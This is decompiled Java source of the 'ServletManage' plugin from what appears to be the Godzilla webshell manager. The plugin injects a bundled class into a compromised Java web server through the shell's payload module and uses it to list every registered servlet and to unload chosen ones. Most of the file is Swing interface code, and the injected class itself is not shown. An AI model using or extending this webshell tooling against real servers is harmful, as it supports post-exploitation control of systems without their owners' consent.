/*     */ package shells.plugins.java;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.GBC;
/*     */ import core.ui.component.RTextArea;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.Dimension;
/*     */ import java.awt.Frame;
/*     */ import java.awt.GridBagLayout;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ComponentAdapter;
/*     */ import java.awt.event.ComponentEvent;
/*     */ import java.awt.event.WindowEvent;
/*     */ import java.awt.event.WindowListener;
/*     */ import java.io.InputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JDialog;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTextField;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "ServletManage", DisplayName = "ServletManage")
/*     */ public class ServletManage
/*     */   implements Plugin
/*     */ {
/*     */   private static final String CLASS_NAME = "plugin.ServletManage";
/*     */   private final JPanel panel;
/*     */   private final JButton getAllServletButton;
/*     */   private final JButton unLoadServletButton;
/*     */   private final JSplitPane splitPane;
/*     */   private final RTextArea resultTextArea;
/*     */   private boolean loadState;
/*     */   private ShellEntity shellEntity;
/*     */   private Payload payload;
/*     */   private Encoding encoding;
/*     */   
/*     */   public ServletManage() {
/*  52 */     this.panel = new JPanel(new BorderLayout());
/*  53 */     this.getAllServletButton = new JButton("GetAllServlet");
/*  54 */     this.unLoadServletButton = new JButton("UnLoadServlet");
/*  55 */     this.resultTextArea = new RTextArea();
/*  56 */     this.splitPane = new JSplitPane();
/*     */     
/*  58 */     this.splitPane.setOrientation(0);
/*  59 */     this.splitPane.setDividerSize(0);
/*     */     
/*  61 */     JPanel topPanel = new JPanel();
/*     */     
/*  63 */     topPanel.add(this.getAllServletButton);
/*  64 */     topPanel.add(this.unLoadServletButton);
/*     */     
/*  66 */     this.splitPane.setTopComponent(topPanel);
/*  67 */     this.splitPane.setBottomComponent(new JScrollPane((Component)this.resultTextArea));
/*     */     
/*  69 */     this.splitPane.addComponentListener(new ComponentAdapter()
/*     */         {
/*     */           public void componentResized(ComponentEvent e) {
/*  72 */             ServletManage.this.splitPane.setDividerLocation(0.15D);
/*     */           }
/*     */         });
/*     */     
/*  76 */     this.panel.add(this.splitPane);
/*     */   }
/*     */ 
/*     */   
/*     */   private void getAllServletButtonClick(ActionEvent actionEvent) {
/*  81 */     this.resultTextArea.setText(getAllServlet());
/*     */   }
/*     */   private void unLoadServletButtonClick(ActionEvent actionEvent) {
/*  84 */     UnServlet unServlet = (new UnLoadServletDialog((Frame)this.shellEntity.getFrame(), "UnLoadServlet", "", "")).getResult();
/*  85 */     if (unServlet.state) {
/*  86 */       String resultString = unLoadServlet(unServlet.wrapperName, unServlet.urlPattern);
/*  87 */       Log.log(resultString, new Object[0]);
/*  88 */       GOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
/*     */     } else {
/*  90 */       Log.log("用户取消选择.....", new Object[0]);
/*     */     } 
/*     */   }
/*     */   
/*     */   private void load() {
/*  95 */     if (!this.loadState) {
/*     */       try {
/*  97 */         InputStream inputStream = getClass().getResourceAsStream("assets/ServletManage.classs");
/*  98 */         byte[] data = functions.readInputStream(inputStream);
/*  99 */         inputStream.close();
/* 100 */         if (this.payload.include("plugin.ServletManage", data)) {
/* 101 */           this.loadState = true;
/* 102 */           Log.log("Load success", new Object[0]);
/*     */         } else {
/* 104 */           Log.log("Load fail", new Object[0]);
/*     */         } 
/* 106 */       } catch (Exception e) {
/* 107 */         Log.error(e);
/*     */       } 
/*     */     }
/*     */   }
/*     */   
/*     */   private String getAllServlet() {
/* 113 */     load();
/* 114 */     byte[] resultByteArray = this.payload.evalFunc("plugin.ServletManage", "getAllServlet", new ReqParameter());
/* 115 */     return this.encoding.Decoding(resultByteArray);
/*     */   }
/*     */   
/*     */   private String unLoadServlet(String wrapperName, String urlPattern) {
/* 119 */     load();
/* 120 */     ReqParameter reqParameter = new ReqParameter();
/* 121 */     reqParameter.add("wrapperName", wrapperName);
/* 122 */     reqParameter.add("urlPattern", urlPattern);
/* 123 */     byte[] resultByteArray = this.payload.evalFunc("plugin.ServletManage", "unLoadServlet", reqParameter);
/* 124 */     return this.encoding.Decoding(resultByteArray);
/*     */   }
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 129 */     this.shellEntity = shellEntity;
/* 130 */     this.payload = this.shellEntity.getPayloadModule();
/* 131 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 132 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 139 */     return this.panel;
/*     */   }
/*     */   
/*     */   class UnServlet {
/*     */     public boolean state;
/*     */     public String wrapperName;
/*     */     public String urlPattern; }
/*     */   
/*     */   class UnLoadServletDialog extends JDialog {
/*     */     private final JTextField wrapperNameTextField;
/*     */     private final JTextField urlPatternTextField;
/*     */     private final JLabel wrapperNameLabel;
/*     */     private final JLabel urlPatternLabel;
/*     */     private final JButton okButton;
/*     */     private final JButton cancelButton;
/*     */     private final ServletManage.UnServlet unServlet;
/* 155 */     private final Dimension TextFieldDim = new Dimension(500, 23);
/*     */     
/*     */     private UnLoadServletDialog(Frame frame, String tipString, String wrapperNameString, String urlPatternString) {
/* 158 */       super(frame, tipString, true);
/*     */       
/* 160 */       this.unServlet = new ServletManage.UnServlet();
/*     */       
/* 162 */       this.wrapperNameTextField = new JTextField("wrapperNameText", 30);
/* 163 */       this.urlPatternTextField = new JTextField("destText", 30);
/* 164 */       this.wrapperNameLabel = new JLabel("wrapperName");
/* 165 */       this.urlPatternLabel = new JLabel("urlPattern");
/*     */       
/* 167 */       this.okButton = new JButton("unLoad");
/* 168 */       this.cancelButton = new JButton("cancel");
/* 169 */       Dimension TextFieldDim = new Dimension(200, 23);
/*     */       
/* 171 */       GBC gbcLSrcFile = (new GBC(0, 0)).setInsets(5, -40, 0, 0);
/* 172 */       GBC gbcSrcFile = (new GBC(1, 0, 3, 1)).setInsets(5, 20, 0, 0);
/* 173 */       GBC gbcLDestFile = (new GBC(0, 1)).setInsets(5, -40, 0, 0);
/* 174 */       GBC gbcDestFile = (new GBC(1, 1, 3, 1)).setInsets(5, 20, 0, 0);
/* 175 */       GBC gbcOkButton = (new GBC(0, 2, 2, 1)).setInsets(5, 20, 0, 0);
/* 176 */       GBC gbcCancelButton = (new GBC(2, 2, 1, 1)).setInsets(5, 20, 0, 0);
/*     */       
/* 178 */       this.wrapperNameTextField.setPreferredSize(TextFieldDim);
/* 179 */       this.urlPatternTextField.setPreferredSize(TextFieldDim);
/*     */       
/* 181 */       setLayout(new GridBagLayout());
/*     */       
/* 183 */       add(this.wrapperNameLabel, gbcLSrcFile);
/* 184 */       add(this.wrapperNameTextField, gbcSrcFile);
/*     */       
/* 186 */       add(this.urlPatternLabel, gbcLDestFile);
/* 187 */       add(this.urlPatternTextField, gbcDestFile);
/* 188 */       add(this.okButton, gbcOkButton);
/* 189 */       add(this.cancelButton, gbcCancelButton);
/*     */       
/* 191 */       automaticBindClick.bindJButtonClick(this, this);
/*     */       
/* 193 */       addWindowListener(new WindowListener()
/*     */           {
/*     */             public void windowOpened(WindowEvent paramWindowEvent) {}
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */             
/*     */             public void windowIconified(WindowEvent paramWindowEvent) {}
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */             
/*     */             public void windowDeiconified(WindowEvent paramWindowEvent) {}
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */             
/*     */             public void windowDeactivated(WindowEvent paramWindowEvent) {}
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */             
/*     */             public void windowClosing(WindowEvent paramWindowEvent) {
/* 221 */               ServletManage.UnLoadServletDialog.this.cancelButtonClick((ActionEvent)null);
/*     */             }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */             
/*     */             public void windowClosed(WindowEvent paramWindowEvent) {}
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */             
/*     */             public void windowActivated(WindowEvent paramWindowEvent) {}
/*     */           });
/* 237 */       this.wrapperNameTextField.setText(wrapperNameString);
/* 238 */       this.urlPatternTextField.setText(urlPatternString);
/*     */       
/* 240 */       functions.setWindowSize(this, 650, 180);
/* 241 */       setLocationRelativeTo(frame);
/* 242 */       setDefaultCloseOperation(2);
/* 243 */       setVisible(true);
/*     */     }
/*     */     
/*     */     public ServletManage.UnServlet getResult() {
/* 247 */       return this.unServlet;
/*     */     }
/*     */     
/*     */     private void okButtonClick(ActionEvent actionEvent) {
/* 251 */       this.unServlet.state = true;
/* 252 */       changeFileInfo();
/*     */     }
/*     */     
/*     */     private void cancelButtonClick(ActionEvent actionEvent) {
/* 256 */       this.unServlet.state = false;
/* 257 */       changeFileInfo();
/*     */     }
/*     */     private void changeFileInfo() {
/* 260 */       this.unServlet.urlPattern = this.urlPatternTextField.getText();
/* 261 */       this.unServlet.wrapperName = this.wrapperNameTextField.getText();
/* 262 */       dispose();
/*     */     }
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\java\ServletManage.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */